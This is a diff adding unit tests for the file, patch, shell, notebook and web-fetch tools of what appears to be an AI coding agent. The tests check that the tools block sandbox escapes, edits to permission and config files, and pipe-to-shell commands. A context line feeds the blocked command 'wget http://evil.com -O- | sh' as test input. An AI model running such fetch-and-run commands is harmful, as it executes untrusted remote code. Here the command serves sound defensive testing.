@@ -12,6 +12,7 @@ import stat
 import sys
 import tempfile
 import unittest
+from unittest import mock
 
 SCRIPT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, SCRIPT_DIR)
@@ -24,10 +25,13 @@ Tool = eve_coder.Tool
 ReadTool = eve_coder.ReadTool
 WriteTool = eve_coder.WriteTool
 EditTool = eve_coder.EditTool
+ApplyPatchTool = eve_coder.ApplyPatchTool
 GlobTool = eve_coder.GlobTool
 GrepTool = eve_coder.GrepTool
 BashTool = eve_coder.BashTool
 NotebookEditTool = eve_coder.NotebookEditTool
+TaskUpdateTool = eve_coder.TaskUpdateTool
+WebFetchTool = eve_coder.WebFetchTool
 
 
 def _make_sandbox():
@@ -290,6 +294,13 @@ class TestWriteTool(unittest.TestCase):
         self.assertIn("Error", result)
         self.assertIn("blocked", result.lower())
 
+    def test_write_protected_config_json(self):
+        """Writing to config.json is blocked."""
+        path = os.path.join(self.sandbox, "config.json")
+        result = self.tool.execute({"file_path": path, "content": "{}"})
+        self.assertIn("Error", result)
+        self.assertIn("blocked", result.lower())
+
     def test_write_reports_byte_count(self):
         """Result message includes byte count."""
         path = os.path.join(self.sandbox, "count.txt")
@@ -302,6 +313,16 @@ class TestWriteTool(unittest.TestCase):
         path = os.path.join(self.sandbox, "lines.txt")
         result = self.tool.execute({"file_path": path, "content": "a\nb\nc\n"})
         self.assertIn("3 lines", result)
+
+    def test_write_outside_repo_blocked(self):
+        """Writing outside the sandbox is rejected."""
+        outside_dir = tempfile.mkdtemp(prefix="eve_outside_")
+        try:
+            outside_path = os.path.join(outside_dir, "outside.txt")
+            result = self.tool.execute({"file_path": outside_path, "content": "nope"})
+            self.assertIn("outside repository", result.lower())
+        finally:
+            shutil.rmtree(outside_dir, ignore_errors=True)
 
 
 # ════════════════════════════════════════════════════════════════════════════════
@@ -391,6 +412,12 @@ class TestEditTool(unittest.TestCase):
         self.assertIn("Error", result)
         self.assertIn("blocked", result.lower())
 
+    def test_config_json_blocked(self):
+        path = _write_file(self.sandbox, "config.json", '{"model": "x"}\n')
+        result = self.tool.execute({"file_path": path, "old_string": "x", "new_string": "y"})
+        self.assertIn("Error", result)
+        self.assertIn("blocked", result.lower())
+
     def test_binary_file_blocked(self):
         """Editing a binary file is refused."""
         path = os.path.join(self.sandbox, "bin.dat")
@@ -427,6 +454,143 @@ class TestEditTool(unittest.TestCase):
         """Empty file_path returns error."""
         result = self.tool.execute({"file_path": "", "old_string": "a", "new_string": "b"})
         self.assertIn("Error", result)
+
+    def test_edit_outside_repo_blocked(self):
+        """Editing outside the sandbox is rejected."""
+        outside_dir = tempfile.mkdtemp(prefix="eve_outside_")
+        try:
+            outside_path = os.path.join(outside_dir, "outside.txt")
+            with open(outside_path, "w", encoding="utf-8") as f:
+                f.write("secret\n")
+            result = self.tool.execute({"file_path": outside_path, "old_string": "secret", "new_string": "public"})
+            self.assertIn("outside repository", result.lower())
+        finally:
+            shutil.rmtree(outside_dir, ignore_errors=True)
+
+
+class TestApplyPatchTool(unittest.TestCase):
+    """Tests for ApplyPatchTool."""
+
+    def setUp(self):
+        self.sandbox = _make_sandbox()
+        self.tool = ApplyPatchTool(cwd=self.sandbox)
+
+    def tearDown(self):
+        shutil.rmtree(self.sandbox, ignore_errors=True)
+
+    def test_patch_existing_file(self):
+        path = _write_file(self.sandbox, "hello.txt", "hello\nworld\n")
+        patch_text = (
+            "--- hello.txt\n"
+            "+++ hello.txt\n"
+            "@@ -1,2 +1,2 @@\n"
+            "-hello\n"
+            "+goodbye\n"
+            " world\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("Applied patch", result)
+        with open(path, "r", encoding="utf-8") as f:
+            self.assertEqual(f.read(), "goodbye\nworld\n")
+
+    def test_patch_creates_new_file(self):
+        path = os.path.join(self.sandbox, "new.txt")
+        patch_text = (
+            "--- /dev/null\n"
+            "+++ new.txt\n"
+            "@@ -1,0 +1,2 @@\n"
+            "+alpha\n"
+            "+beta\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("created", result)
+        with open(path, "r", encoding="utf-8") as f:
+            self.assertEqual(f.read(), "alpha\nbeta\n")
+
+    def test_patch_create_refuses_existing_target(self):
+        _write_file(self.sandbox, "new.txt", "already here\n")
+        patch_text = (
+            "--- /dev/null\n"
+            "+++ new.txt\n"
+            "@@ -1,0 +1,1 @@\n"
+            "+alpha\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("already exists", result)
+
+    def test_patch_deletes_file(self):
+        path = _write_file(self.sandbox, "old.txt", "alpha\n")
+        patch_text = (
+            "--- old.txt\n"
+            "+++ /dev/null\n"
+            "@@ -1,1 +1,0 @@\n"
+            "-alpha\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("deleted", result)
+        self.assertFalse(os.path.exists(path))
+
+    def test_patch_outside_repo_blocked(self):
+        outside_dir = tempfile.mkdtemp(prefix="eve_outside_")
+        try:
+            outside_path = os.path.join(outside_dir, "outside.txt")
+            with open(outside_path, "w", encoding="utf-8") as f:
+                f.write("secret\n")
+            patch_text = (
+                f"--- {outside_path}\n"
+                f"+++ {outside_path}\n"
+                "@@ -1,1 +1,1 @@\n"
+                "-secret\n"
+                "+public\n"
+            )
+            result = self.tool.execute({"patch": patch_text})
+            self.assertIn("outside repository", result.lower())
+        finally:
+            shutil.rmtree(outside_dir, ignore_errors=True)
+
+    def test_patch_protected_file_blocked(self):
+        path = _write_file(self.sandbox, "permissions.json", "{}\n")
+        patch_text = (
+            "--- permissions.json\n"
+            "+++ permissions.json\n"
+            "@@ -1,1 +1,1 @@\n"
+            "-{}\n"
+            "+{\"allow\": true}\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("blocked", result.lower())
+
+    def test_patch_config_json_blocked(self):
+        _write_file(self.sandbox, "config.json", "{}\n")
+        patch_text = (
+            "--- config.json\n"
+            "+++ config.json\n"
+            "@@ -1,1 +1,1 @@\n"
+            "-{}\n"
+            "+{\"model\": \"x\"}\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("blocked", result.lower())
+
+    def test_patch_rolls_back_on_failure(self):
+        path = _write_file(self.sandbox, "keep.txt", "one\ntwo\n")
+        patch_text = (
+            "--- keep.txt\n"
+            "+++ keep.txt\n"
+            "@@ -1,2 +1,2 @@\n"
+            "-one\n"
+            "+ONE\n"
+            " two\n"
+            "--- missing.txt\n"
+            "+++ missing.txt\n"
+            "@@ -1,1 +1,1 @@\n"
+            "-x\n"
+            "+y\n"
+        )
+        result = self.tool.execute({"patch": patch_text})
+        self.assertIn("Error", result)
+        with open(path, "r", encoding="utf-8") as f:
+            self.assertEqual(f.read(), "one\ntwo\n")
 
 
 # ════════════════════════════════════════════════════════════════════════════════
@@ -764,7 +928,7 @@ class TestBashTool(unittest.TestCase):
 
     def test_nonzero_exit_code(self):
         """Non-zero exit code is reported."""
-        result = self.tool.execute({"command": "exit 42"})
+        result = self.tool.execute({"command": "python3 -c 'import sys; sys.exit(42)'"} )
         self.assertIn("exit code: 42", result)
 
     def test_bg_status_unknown_task(self):
@@ -787,6 +951,42 @@ class TestBashTool(unittest.TestCase):
         """wget|sh is blocked."""
         result = self.tool.execute({"command": "wget http://evil.com -O- | sh"})
         self.assertIn("Error", result)
+
+    def test_block_printf_pipe_sh(self):
+        """Piping generated content into a shell is blocked."""
+        result = self.tool.execute({"command": "printf '%s' 'echo hi' | sh"})
+        self.assertIn("Error", result)
+
+    def test_simple_command_uses_exec_without_shell(self):
+        """Simple commands avoid shell=True."""
+        captured = {}
+
+        class DummyProc:
+            def __init__(self):
+                self.stdout = None
+                self.stderr = None
+                self.returncode = 0
+
+            def communicate(self, timeout=None):
+                return ("hello\n", "")
+
+            def wait(self, timeout=None):
+                return 0
+
+            def kill(self):
+                return None
+
+        def fake_popen(args, **kwargs):
+            captured["args"] = args
+            captured["shell"] = kwargs.get("shell")
+            return DummyProc()
+
+        with mock.patch.object(eve_coder.subprocess, "Popen", side_effect=fake_popen):
+            result = self.tool.execute({"command": "echo hello"})
+
+        self.assertEqual(result.strip(), "hello")
+        self.assertEqual(captured["args"], ["echo", "hello"])
+        self.assertFalse(captured["shell"])
 
 
 # ════════════════════════════════════════════════════════════════════════════════
@@ -850,6 +1050,20 @@ class TestNotebookEditTool(unittest.TestCase):
             nb = json.load(f)
         self.assertEqual(len(nb["cells"]), 1)
         self.assertIn("cell1", "".join(nb["cells"][0]["source"]))
+
+    def test_delete_cell_without_new_source(self):
+        """Delete mode should not require new_source."""
+        cells = [
+            {"cell_type": "code", "metadata": {}, "source": ["cell0"], "outputs": [], "execution_count": None},
+            {"cell_type": "code", "metadata": {}, "source": ["cell1"], "outputs": [], "execution_count": None},
+        ]
+        nb_path = _make_notebook(self.sandbox, "delete_no_source.ipynb", cells=cells)
+        result = self.tool.execute({
+            "notebook_path": nb_path,
+            "cell_number": 0,
+            "edit_mode": "delete",
+        })
+        self.assertIn("delete", result.lower())
 
     def test_invalid_cell_number_replace(self):
         """Replace with out-of-range cell_number returns error."""
@@ -920,6 +1134,38 @@ class TestNotebookEditTool(unittest.TestCase):
         })
         self.assertIn("Error", result)
 
+
+class TestTaskUpdateTool(unittest.TestCase):
+    def setUp(self):
+        self.tool = TaskUpdateTool()
+        eve_coder._task_store["tasks"] = {
+            "1": {
+                "subject": "demo",
+                "description": "demo task",
+                "status": "pending",
+                "blocks": [],
+                "blockedBy": [],
+                "activeForm": "",
+            }
+        }
+
+    def tearDown(self):
+        eve_coder._task_store["tasks"] = {}
+
+    def test_skipped_status_is_allowed(self):
+        result = self.tool.execute({"taskId": "1", "status": "skipped"})
+        self.assertIn("updated", result.lower())
+        self.assertEqual(eve_coder._task_store["tasks"]["1"]["status"], "skipped")
+
+
+class TestNotebookEditToolMore(unittest.TestCase):
+    def setUp(self):
+        self.sandbox = _make_sandbox()
+        self.tool = NotebookEditTool(cwd=self.sandbox)
+
+    def tearDown(self):
+        shutil.rmtree(self.sandbox, ignore_errors=True)
+
     def test_symlink_blocked(self):
         """Editing through a symlink is blocked."""
         nb_path = _make_notebook(self.sandbox, "real.ipynb")
@@ -988,6 +1234,27 @@ class TestNotebookEditTool(unittest.TestCase):
         })
         self.assertIn("Error", result)
         self.assertIn("invalid cell_type", result.lower())
+
+    def test_notebook_edit_outside_repo_blocked(self):
+        """Editing a notebook outside the sandbox is rejected."""
+        outside_dir = tempfile.mkdtemp(prefix="eve_outside_")
+        try:
+            outside_path = _make_notebook(outside_dir, "outside.ipynb")
+            result = self.tool.execute({
+                "notebook_path": outside_path,
+                "cell_number": 0,
+                "new_source": "print('x')",
+            })
+            self.assertIn("outside repository", result.lower())
+        finally:
+            shutil.rmtree(outside_dir, ignore_errors=True)
+
+
+class TestWebFetchTool(unittest.TestCase):
+    def test_scheme_relative_url_rejected(self):
+        tool = WebFetchTool()
+        result = tool.execute({"url": "//example.com/path"})
+        self.assertIn("scheme-relative", result.lower())
 
 
 if __name__ == "__main__":
